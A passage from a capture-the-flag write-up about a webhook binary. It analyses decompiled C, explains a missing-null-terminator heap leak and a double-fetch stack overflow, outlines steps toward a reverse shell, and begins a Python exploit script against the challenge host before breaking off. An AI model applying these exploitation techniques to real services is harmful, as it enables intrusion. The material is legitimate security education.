</span></span><span class="line"><span class="cl">        <span class="nf">curl_easy_setopt</span><span class="p">(</span><span class="n">v39</span><span class="p">,</span> <span class="mi">10023LL</span><span class="p">,</span> <span class="n">headers</span><span class="p">);</span><span class="c1">// CURLOPT_HTTPHEADER
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">v21</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">v25</span> <span class="o">=</span> <span class="nf">curl_easy_perform</span><span class="p">(</span><span class="n">v39</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">curl_slist_free_all</span><span class="p">(</span><span class="n">headers</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="n">v25</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="n">resp_headers</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="n">v24</span> <span class="o">=</span> <span class="mh">0x200002</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="nf">curl_easy_getinfo</span><span class="p">(</span><span class="n">v39</span><span class="p">,</span> <span class="mh">0x200002LL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v19</span><span class="p">);</span><span class="c1">// CURLINFO_RESPONSE_CODE
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="n">resp_headers</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">v19</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="nf">curl_easy_cleanup</span><span class="p">(</span><span class="n">v39</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">for</span> <span class="p">(</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">num_hooks</span> <span class="o">&gt;</span> <span class="n">k</span><span class="p">;</span> <span class="o">++</span><span class="n">k</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nf">free</span><span class="p">(</span><span class="n">targets</span><span class="p">[</span><span class="n">k</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">      <span class="k">for</span> <span class="p">(</span> <span class="n">m</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">num_hooks</span> <span class="o">&gt;</span> <span class="n">m</span><span class="p">;</span> <span class="o">++</span><span class="n">m</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="n">resp_headers</span><span class="p">[</span><span class="n">m</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="n">result</span> <span class="o">==</span> <span class="mi">200</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">          <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;all hooks failed for kind %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">kind_</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="nl">LABEL_2</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">v3</span> <span class="o">=</span> <span class="n">stderr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v4</span> <span class="o">=</span> <span class="n">kind_</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v5</span> <span class="o">=</span> <span class="nf">PQerrorMessage</span><span class="p">(</span><span class="n">conn_</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">v3</span><span class="p">,</span> <span class="s">&#34;unable to load hooks for kind %s: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v4</span><span class="p">,</span> <span class="n">v5</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">PQclear</span><span class="p">(</span><span class="n">v46</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>What we discovered was that the <code>perform_hooks</code> function attempted to fetch rows from the <code>hooks</code> table that matched the <code>kind</code> value that had been previously fetched. From there, it would attempt to hit the stored <code>target</code> (<code>url</code>) that we had previously inserted via the <code>watch</code> function. As we dug deeper into the code, my teammates (cbmixx and kexplo1t) uncovered two bugs within this function:</p>
<h4 id="null-terminator-bug">Null-terminator bug</h4>
<p>Let&rsquo;s check this LOCs:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">      <span class="n">v8</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">n</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">targets</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">v8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">v9</span> <span class="o">=</span> <span class="n">targets</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">      <span class="n">v10</span> <span class="o">=</span> <span class="nf">PQgetvalue</span><span class="p">(</span><span class="n">v46</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">memcpy</span><span class="p">(</span><span class="n">v9</span><span class="p">,</span> <span class="n">v10</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We observed that there was a bug present in which the last byte of the memory block created by the <code>malloc(n+1)</code> call was not cleared during the <code>memcpy</code> call. Specifically, the <code>memcpy</code> call only used the first <code>n</code> bytes, leaving the uninitialized last byte alone. If the uninitialized last byte was not null-terminator, then it was possible for the <code>targets[i]</code> value to be extended by the uninitialized value within the <code>heap</code>. As a result, we could potentially leak some useful values during the program&rsquo;s use of <code>curl</code> to hit the <code>targets[i]</code> value.</p>
<p>To provide an example, let&rsquo;s say that the <code>targets[i]</code> is <code>http://test/?x=_</code>. Due to the extra last byte not being cleared, there was a possibility that during the <code>curl</code> call, the <code>targets[i]</code> value could become <code>http://test?x=_extradata</code>. Therefore, we set up a listening server to capture incoming requests from the <code>webhook</code>, in the hopes that the <code>extradata</code> would contain some useful values.</p>
<h4 id="double-fetch-bug">Double-fetch bug</h4>
<p>Let&rsquo;s check this LOCs:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">  <span class="n">v46</span> <span class="o">=</span> <span class="nf">PQexecParams</span><span class="p">(</span><span class="n">conn_</span><span class="p">,</span> <span class="s">&#34;SELECT count(kind) FROM hooks WHERE kind = $1&#34;</span><span class="p">,</span> <span class="mi">1LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">kind_</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">1LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="nf">PQresultStatus</span><span class="p">(</span><span class="n">v46</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">goto</span> <span class="n">LABEL_2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span> <span class="o">=</span> <span class="nf">PQgetvalue</span><span class="p">(</span><span class="n">v46</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">num_hooks</span> <span class="o">=</span> <span class="nf">byteswap64</span><span class="p">(</span><span class="o">*</span><span class="n">v7</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">PQclear</span><span class="p">(</span><span class="n">v46</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">num_hooks</span> <span class="o">&gt;</span> <span class="mh">0xA</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;too many hooks (%zu) for kind %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">num_hooks</span><span class="p">,</span> <span class="n">kind_</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">num_hooks</span> <span class="o">=</span> <span class="mi">10LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">v46</span> <span class="o">=</span> <span class="nf">PQexecParams</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">          <span class="n">conn_</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="s">&#34;SELECT target, secret FROM hooks WHERE kind = $1 ORDER BY target LIMIT 10&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="mi">1LL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="mi">0LL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="o">&amp;</span><span class="n">kind_</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="mi">0LL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="mi">0LL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="mi">1LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="nf">PQresultStatus</span><span class="p">(</span><span class="n">v46</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">v45</span> <span class="o">=</span> <span class="n">num_hooks</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v15</span><span class="p">[</span><span class="mi">22</span><span class="p">]</span> <span class="o">=</span> <span class="n">num_hooks</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v15</span><span class="p">[</span><span class="mi">23</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v15</span><span class="p">[</span><span class="mi">27</span><span class="p">]</span> <span class="o">=</span> <span class="n">num_hooks</span> <span class="o">&gt;&gt;</span> <span class="mi">58</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v15</span><span class="p">[</span><span class="mi">26</span><span class="p">]</span> <span class="o">=</span> <span class="n">num_hooks</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v15</span><span class="p">[</span><span class="mi">20</span><span class="p">]</span> <span class="o">=</span> <span class="n">num_hooks</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v15</span><span class="p">[</span><span class="mi">21</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v15</span><span class="p">[</span><span class="mi">25</span><span class="p">]</span> <span class="o">=</span> <span class="n">num_hooks</span> <span class="o">&gt;&gt;</span> <span class="mi">58</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v15</span><span class="p">[</span><span class="mi">24</span><span class="p">]</span> <span class="o">=</span> <span class="n">num_hooks</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">secrets</span> <span class="o">=</span> <span class="n">v15</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v43</span> <span class="o">=</span> <span class="n">num_hooks</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v15</span><span class="p">[</span><span class="mi">18</span><span class="p">]</span> <span class="o">=</span> <span class="n">num_hooks</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v15</span><span class="p">[</span><span class="mi">19</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v15</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="n">num_hooks</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v15</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">targets</span> <span class="o">=</span> <span class="n">v15</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v41</span> <span class="o">=</span> <span class="n">num_hooks</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v15</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">=</span> <span class="n">num_hooks</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v15</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v15</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">=</span> <span class="n">num_hooks</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v15</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">resp_headers</span> <span class="o">=</span> <span class="n">v15</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">v13</span> <span class="o">=</span> <span class="nf">PQntuples</span><span class="p">(</span><span class="n">v46</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">i</span> <span class="o">&gt;=</span> <span class="n">v13</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">n</span> <span class="o">=</span> <span class="nf">PQgetlength</span><span class="p">(</span><span class="n">v46</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">v8</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">n</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">targets</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">v8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">v9</span> <span class="o">=</span> <span class="n">targets</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">      <span class="n">v10</span> <span class="o">=</span> <span class="nf">PQgetvalue</span><span class="p">(</span><span class="n">v46</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">memcpy</span><span class="p">(</span><span class="n">v9</span><span class="p">,</span> <span class="n">v10</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">v11</span> <span class="o">=</span> <span class="nf">PQgetvalue</span><span class="p">(</span><span class="n">v46</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">v12</span> <span class="o">=</span> <span class="nf">byteswap64</span><span class="p">(</span><span class="o">*</span><span class="n">v11</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">secrets</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">v12</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>It was important for us to note that a double-fetch bug was present within this code, which could trigger an OOB write in the stack. The first fetch involved using the <code>SELECT COUNT(*)</code> query to retrieve the number of rows, which was then stored within the <code>num_hooks</code> variable. This value was then used to allocate the size of both <code>targets</code> and <code>secrets</code> using <code>alloca</code> (Although it wasn&rsquo;t immediately clear, based on our team&rsquo;s observations, the strange operation involving <code>v15</code> and <code>num_hook</code> was equivalent to <code>alloca</code>).</p>
<p>As a result of this, we realized that if we could produce a different result between the <code>SELECT COUNT(*)</code> and the <code>SELECT target, secret</code> queries (where <code>num_hooks</code> was smaller than the number of rows returned from the second query), then we could potentially overflow the stack. This was because the <code>alloca</code> size would be smaller due to the use of the <code>num_hooks</code> value. However, during the setup of the <code>secrets[i]</code> value, it used the <code>PQntuples</code> result to set up the values instead. Since the result was greater than <code>num_hooks</code>, it meant that we could potentially do an out-of-bounds (OOB) write in the stack.</p>
<p>Now that we have identified the bugs, our next step was to think about how to exploit them.</p>
<h3 id="solution">Solution</h3>
<p>To tackle this challenge, we broke the solution down into three steps:</p>
<ul>
<li>Obtaining useful leak values</li>
<li>Triggering the double-fetch bug</li>
<li>Obtaining a Reverse Shell through OOB Write</li>
</ul>
<h4 id="obtaining-useful-leak-values">Obtaining useful leak values</h4>
<p>To gain a better understanding of the <code>heap</code> layout within our local environment, I decided to spent a significant amount of time experimenting with the <code>watch</code> and <code>notify</code> APIs so that I could create a reliable POC to get the leak.</p>
<p>To start, I set up my own listening server to receive the <code>curl</code> request that was triggered by the <code>webhook</code> binary during the processing of the notify API. It&rsquo;s important to note that this step was actually quite <strong>crucial</strong>, as different listening servers can produce different <code>heap</code> layouts. This is because <code>libcurl</code> also uses the <code>heap</code> during the reception of packets from your listening server, meaning that different code within your listening server can produce varying heap layouts.</p>
<p>Given my preference for efficiency, I decided to save some time and simply copied the listening server code from a Stack Overflow <a href="https://stackoverflow.com/questions/57925492/how-to-listen-continuously-to-a-socket-for-data-in-python" target="_blank" rel="noopener noreffer ">question</a> :). From there, I made some minor modifications to the code to fit our specific needs.</p>
<p>After spending some time experimenting with the challenge, I managed to find a way to obtain a <code>libc</code> and <code>heap</code> leak (with a 50% chance, due to the buggy listening server code that I copied from Stack Overflow). Specifically, I called <code>notify</code> and attempted to force the <code>malloc(n+1)</code> call to reuse the same chunk address within the <code>unsorted bin</code> multiple times.</p>
<p>In order to achieve this scenario, I needed to call <code>notify</code> three separate times, each with an increasing size. The first allocation was utilized to set up the initial leak, which was subsequently freed and contained a <code>main_arena</code> address that we could leak in the next allocation.</p>
<p>For the second allocation, we utilized the uninitialized data from the previous allocation to leak the <code>main_arena</code> address, which was also subsequently freed and contained a <code>heap</code> address that we could leak in the next allocation.</p>
<p>Finally, the third allocation was used to leak the <code>heap</code> address, which was obtained from the uninitialized data within the previous allocation.</p>
<p>Here&rsquo;s the code I used to obtain the leak:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">base_url</span> <span class="o">=</span> <span class="s1">&#39;http://c3cb0aa7-ebd9-45c8-9c3c-e7b4c1b96285.collector.chal.pwni.ng:20000&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">login_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/_m/2e7970cbec/loggingIn&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">transact_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/_m/34a106c003/transacting&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">item_map</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;gold&#34;</span><span class="p">:</span> <span class="s2">&#34;0&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;bomb&#34;</span><span class="p">:</span> <span class="s2">&#34;32&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;rum&#34;</span><span class="p">:</span> <span class="s2">&#34;4&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;anchor&#34;</span><span class="p">:</span> <span class="s2">&#34;5&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create_user</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;create_user </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;redirectTo&#34;</span><span class="p">:</span> <span class="s2">&#34;/&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">login_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">session</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">watch</span><span class="p">(</span><span class="n">kind</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">session</span><span class="p">):</span>
